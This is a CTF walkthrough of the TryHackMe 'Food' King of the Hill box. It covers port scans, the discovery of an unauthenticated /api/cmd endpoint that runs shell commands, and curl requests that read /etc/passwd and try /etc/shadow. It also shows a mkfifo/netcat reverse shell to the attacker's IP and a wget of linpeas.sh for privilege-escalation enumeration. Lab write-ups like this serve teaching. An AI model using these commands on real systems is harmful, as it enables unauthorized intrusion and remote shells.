# KoTH Food CTF — Writeup

## Overview
### KoTH Food CTF — Writeup
### KoTH Food CTF — Writeup
----
Practice Food KoTH alone, to get familiar with KoTH!
---
### FoodCTF
Start Machine
This is room for one of the King of the Hill machines, FoodCTF. Capture the food and all the flags, while you're at it.
You can access the official writeup by clicking Options (top right) and then 'Writeups'.
This box was from the April 2020 KoTH rotation. It awards no points, as the current question system doesn't allow me to do this.
Answer the questions below

## Enumeration
```text
┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
└─$ deactivate 

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.241.181 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.241.181:22
Open 10.10.241.181:9999
Open 10.10.241.181:15065
Open 10.10.241.181:16109
Open 10.10.241.181:46969
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.241.181 [5 ports]
Discovered open port 22/tcp on 10.10.241.181
Discovered open port 46969/tcp on 10.10.241.181
Discovered open port 9999/tcp on 10.10.241.181
Discovered open port 15065/tcp on 10.10.241.181
Discovered open port 16109/tcp on 10.10.241.181
Completed Connect Scan (5 total ports)
Initiating Service scan
Scanning 5 services on 10.10.241.181
Completed Service scan (5 services on 1 host)
NSE: Script scanning 10.10.241.181.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.241.181
Host is up, received user-set (0.20s latency).

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 280c0cd95a7dbee6f43ced1051494d19 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKjhSBkXZSZMWPqxiPKa9BxFKoQC6ZhXkKFa28z6w3yLpDBuzZTKyzkoLBm0n8APmlqu9CxnHyVZEmZYwddFuj4FMuAyYNS4BHFg5xMtnKlJK2OKol6F+DRaV8S98FEz0uFaI5yR5PUUtFrByqF01ppr04/HHVvBQpoZDCUabPZRJiEtOi/a5fhBvYRMGJdlijUiee6AoWf4tOc6RPgzxHi2bkqWKyGqdTf26p22tHk0XgSgzQzSh8ABrODNzm04EZYd9+ZHupIo2/mRJGQlBMoVuCcbQpdQrpP/+ivVFiCM8kytrn5Z3ayu6bEslCsbSjvG5VCtAHe2U+q2bsrZ/l
|   256 17ce033bbb207809ab76c06d8dc4df51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCe4ipBH4bCimLbh8uzN1ix9+rEVIPbFdICCeNBR/+lndHq94/4Ow0odFFBok3r8lFVaPUSTj8QJNES04lSe/sY=
|   256 078a50b55b4aa76cc8b3a1ca77b90d07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEnPlJ5lhNGmcnRSde/U2Jg6eHjsPIm08Z4fRBrjk2Qf
9999/tcp  open  abyss?  syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 18 Feb 2023 16:11:53 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 18 Feb 2023 16:11:52 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|_    king
15065/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Host monitoring
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
16109/tcp open  unknown syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 18 Feb 2023 16:11:52 GMT
|     Content-Type: image/jpeg
|     JFIF
|     #*%%*525EE\xff
|     #*%%*525EE\xff
|     $3br
|     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     Y$?_
|     qR]$Oyk
|_    |$o.
46969/tcp open  telnet  syn-ack Linux telnetd
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9999-TCP:V=7.93%I=7%D=2/18%Time=63F0F8C8%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,78,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2018\x20Feb\x2020
SF:23\x2016:11:52\x20GMT\r\nContent-Length:\x204\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\n\r\nking")%r(HTTPOptions,78,"HTTP/1\.0\x2020
SF:0\x20OK\r\nDate:\x20Sat,\x2018\x20Feb\x202023\x2016:11:52\x20GMT\r\nCon
SF:tent-Length:\x204\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\
SF:r\nking")%r(FourOhFourRequest,78,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sa
SF:t,\x2018\x20Feb\x202023\x2016:11:53\x20GMT\r\nContent-Length:\x204\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nking")%r(GenericLin
SF:es,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(T
SF:LSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port16109-TCP:V=7.93%I=7%D=2/18%Time=63F0F8C8%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2DE8,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,
SF:\x2018\x20Feb\x202023\x2016:11:52\x20GMT\r\nContent-Type:\x20image/jpeg
SF:\r\n\r\n\xff\xd8\xff\xe0\0\x10JFIF\0\x01\x01\x01\0H\0H\0\0\xff\xdb\0C\0
SF:\x02\x03\x03\x03\x04\x03\x04\x05\x05\x04\x06\x06\x06\x06\x06\x08\x08\x0
SF:7\x07\x08\x08\r\t\n\t\n\t\r\x13\x0c\x0e\x0c\x0c\x0e\x0c\x13\x11\x14\x11
SF:\x0f\x11\x14\x11\x1e\x18\x15\x15\x18\x1e#\x1d\x1c\x1d#\*%%\*525EE\\\xff
SF:\xdb\0C\x01\x02\x03\x03\x03\x04\x03\x04\x05\x05\x04\x06\x06\x06\x06\x06
SF:\x08\x08\x07\x07\x08\x08\r\t\n\t\n\t\r\x13\x0c\x0e\x0c\x0c\x0e\x0c\x13\
SF:x11\x14\x11\x0f\x11\x14\x11\x1e\x18\x15\x15\x18\x1e#\x1d\x1c\x1d#\*%%\*
SF:525EE\\\xff\xc0\0\x11\x08\x03\x84\x05F\x03\x01\"\0\x02\x11\x01\x03\x11\
SF:x01\xff\xc4\0\x1f\0\0\x01\x05\x01\x01\x01\x01\x01\x01\0\0\0\0\0\0\0\0\x
SF:01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\0\xb5\x10\0\x02\x01\x03\
SF:x03\x02\x04\x03\x05\x05\x04\x04\0\0\x01}\x01\x02\x03\0\x04\x11\x05\x12!
SF:1A\x06\x13Qa\x07\"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf0\$3br\x8
SF:2\t\n\x16\x17\x18\x19\x1a%&'\(\)\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwx
SF:yz\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97\x98\x99\x9a\
SF:xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba
SF:\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xd
SF:a\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf1\xf2\xf3\xf4\xf5\xf6\xf7\x
SF:f8\xf9\xfa\xff\xc4\0\x1f\x01\0\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\
SF:0\0\0\0\0\0\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\0\xb5\x11\0
SF:\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\0\x01\x02w\0\x01\x02\x03\x
SF:11\x04\x05!1\x06\x12AQ\x07aq\x13\"2\x81\x08\x14B\x91\xa1\xb1\xc1\t#3R\x
SF:f0\x15br\xd1\n\x16\$4\xe1%\xf1\x17\x18\x19\x1a&'\(\)\*56789:CDEFGHIJSTU
SF:VWXYZcdefghijstuvwxyz\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x
SF:95\x96\x97\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\
SF:xb5\xb6\xb7\xb8\xb9\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4
SF:\xd5\xd6\xd7\xd8\xd9\xda\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf2\xf3\xf
SF:4\xf5\xf6\xf7\xf8\xf9\xfa\xff\xda\0\x0c\x03\x01\0\x02\x11\x03\x11\0\?\0
SF:\xfa\x96F\xf3/\x0f\xcd\xc0\xdcp\x7f\*\x97!\x1e\xd4p\x7f\|\x83\xdf\x8c\x
SF:b7\xf4\xa4\xb4\x8e=\x92\xc9\xce\xec\xe2\x90\xc6Zks\x91\x85Y\$\?_\xba\+\
SF:x81\x1e\xa9E\xees31\xe0\x02\xccA\xfe\x20\xa35\x90\x1c\xff\0fC\x95\x1b\x
SF:88\x047L\xe4\xf4\x1f\x9d\^\x92=\xdez\?\xded!~\x8eqR\]\$Oyk\x02\x81\x85\
SF:xc1\xc9\xe8\0\xed\xfaS\x11\|\x05q\x20\xee\xbbT\x0fM\xc6\xa3i\xb2\x97\x9
SF:37\x18\xca\xae:\xd6t\x0e\xdb\xe3\xf4/#\x96\xf4\t\x92\)\xad\xb7\xca\x89\
SF:x03}\xf9@l\xfbsLh\xcb\xba@\xb7d\x86%\x96\xdc\*\xfb\x175\x8b\|\$o\.\xd9N
SF:\xe1\xf2n\xfa\x97\x15\xbdrA\x86G\r\x9c\xce\xaa9\xfe\xe7ZM2\x08");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.20 seconds

http://10.10.241.181:15065/

Site down for maintenance

Blame Dan, he keeps messing with the prod servers.

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.241.181:15065/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.181:15065/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.241.181:15065/monitor              (Status: 301) [Size: 0] [--> monitor/]
Progress: 2703 / 220561 (1.23%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
 Finished
===============================================================

http://10.10.241.181:15065/monitor/

view-source:http://10.10.241.181:15065/monitor/main.js

console.log("Hello, World!")
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'text/plain'
            // 'Content-Type': 'application/x-www-form-urlencoded',
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: data // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
function onLoad() {
    document.getElementById("pingForm").addEventListener("submit", function (event) {
        event.preventDefault()
    });
}
//Steve said I should obfuscate my code to make it better. I don't really understand but it works so meh
const _0x1a9d=['dmFsdWU=','I2hvc3RUb1Bpbmc=','dGVzdA==','SVAgYWRkcmVzcyBpbnZhbGlk','cXVlcnlTZWxlY3Rvcg==','UGluZ2luZzog','dGV4dENvbnRlbnQ='];(function(_0x365cb9,_0x1a9de5){const _0x4d6713=function(_0x1784af){while(--_0x1784af){_0x365cb9['push'](_0x365cb9['shift']());}};_0x4d6713(++_0x1a9de5);}(_0x1a9d,0x148));const _0x4d67=function(_0x365cb9,_0x1a9de5){_0x365cb9=_0x365cb9-0x0;let _0x4d6713=_0x1a9d[_0x365cb9];if(_0x4d67['NLdOOO']===undefined){(function(){let _0x525fb1;try{const _0x3f1d56=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x525fb1=_0x3f1d56();}catch(_0xc71f1){_0x525fb1=window;}const _0x4685a7='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x525fb1['atob']||(_0x525fb1['atob']=function(_0x255321){const _0x24c30f=String(_0x255321)['replace'](/=+$/,'');let _0x5e1a31='';for(let _0x4d6263=0x0,_0x55cd30,_0x4f9f3e,_0x1e913f=0x0;_0x4f9f3e=_0x24c30f['charAt'](_0x1e913f++);~_0x4f9f3e&&(_0x55cd30=_0x4d6263%0x4?_0x55cd30*0x40+_0x4f9f3e:_0x4f9f3e,_0x4d6263++%0x4)?_0x5e1a31+=String['fromCharCode'](0xff&_0x55cd30>>(-0x2*_0x4d6263&0x6)):0x0){_0x4f9f3e=_0x4685a7['indexOf'](_0x4f9f3e);}return _0x5e1a31;});}());_0x4d67['LCDJpm']=function(_0x16dbab){const _0x48165c=atob(_0x16dbab);let _0x25c165=[];for(let _0x2e78af=0x0,_0x1185f3=_0x48165c['length'];_0x2e78af<_0x1185f3;_0x2e78af++){_0x25c165+='%'+('00'+_0x48165c['charCodeAt'](_0x2e78af)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x25c165);};_0x4d67['znaolL']={};_0x4d67['NLdOOO']=!![];}const _0x1784af=_0x4d67['znaolL'][_0x365cb9];if(_0x1784af===undefined){_0x4d6713=_0x4d67['LCDJpm'](_0x4d6713);_0x4d67['znaolL'][_0x365cb9]=_0x4d6713;}else{_0x4d6713=_0x1784af;}return _0x4d6713;};async function pingHost(){const _0x25c165=document[_0x4d67('0x5')]('#outputSection');const _0x2e78af=document[_0x4d67('0x5')](_0x4d67('0x2'));const _0x1185f3=_0x2e78af[_0x4d67('0x1')];if(_0x1185f3!==undefined&&_0x1185f3!==''&&ValidateIPaddress(_0x1185f3)){_0x25c165[_0x4d67('0x0')]=_0x4d67('0x6')+_0x1185f3+'\x0a';const _0x27c227=await postData('/api/cmd','ping\x20-c\x204\x20'+_0x1185f3);_0x25c165['textContent']+=await _0x27c227['text']();}else{_0x25c165[_0x4d67('0x0')]=_0x4d67('0x4');}}function ValidateIPaddress(_0x23b8a0){if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4d67('0x3')](_0x23b8a0)){return!![];}return![];}

Request payload

POST
http://10.10.241.181:15065/api/cmd

ping -c 4 10.8.19.103

┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "ls -lah"
total 7.8M
drwxr-xr-x 6 bread bread 4.0K Apr  6  2020 .
drwxr-xr-x 7 root  root  4.0K Mar 28  2020 ..
-rw------- 1 bread bread    5 Apr  6  2020 .bash_history
-rw-r--r-- 1 bread bread  220 Mar 20  2020 .bash_logout
-rw-r--r-- 1 bread bread 3.7K Mar 20  2020 .bashrc
drwx------ 2 bread bread 4.0K Mar 20  2020 .cache
----r--r-- 1 bread bread   38 Mar 28  2020 flag
drwx------ 3 bread bread 4.0K Mar 20  2020 .gnupg
drwxrwxr-x 3 bread bread 4.0K Mar 20  2020 .local
-rwxrwxr-x 1 bread bread 7.7M Apr  6  2020 main
-rw-rw-r-- 1 bread bread 1.5K Apr  6  2020 main.go
-rw-r--r-- 1 bread bread  825 Mar 28  2020 .profile
drwxrwxr-x 3 bread bread 4.0K Apr  6  2020 resources
                                                                                                                   
┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "cat flag"
ERROR:	exit status 1                                                                                                                   
                                                                                    
┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:thm:/home/tryhackme:/bin/bash
telnetd:x:111:113::/nonexistent:/usr/sbin/nologin
food:x:1001:1001:,,,:/home/food:/bin/bash
mysql:x:112:114:MySQL Server,,,:/nonexistent:/bin/false
pasta:x:1002:1002:,,,:/home/pasta:/bin/bash
ramen:x:1003:1003:,,,:/home/ramen:/bin/bash
bread:x:1004:1004:,,,:/home/bread:/bin/bash
                                                                                                                   
┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "cat /etc/shadow"
ERROR:	exit status 1  

revshell

┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f"

┌──(witty㉿kali)-[~/bug_hunter]
└─$ rlwrap nc -lvnp 1337                                      
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.241.181] 33944
sh: 0: can't access tty; job control turned off
```

## Privilege Escalation
```text
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bread@foodctf:~$ ls
ls
flag  main  main.go  resources
bread@foodctf:~$ cat flag
cat flag
cat: flag: Permission denied

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.241.181 - - [18/Feb/2023 11:35:08] "GET /linpeas.sh HTTP/1.1" 200 -

bread@foodctf:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
wget http://10.8.19.103:8000/linpeas.sh
--  http://10.8.19.103:8000/linpeas.sh
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   528KB/s    in 1.5s    

(528 KB/s) - ‘linpeas.sh’ saved [828098/828098]

bread@foodctf:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
bread@foodctf:/tmp$ ./linpeas.sh

./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-91-generic (buildd@lgw01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020
User & Groups: uid=1004(bread) gid=1004(bread) groups=1004(bread)
Hostname: foodctf
Writable folder: /dev/shm
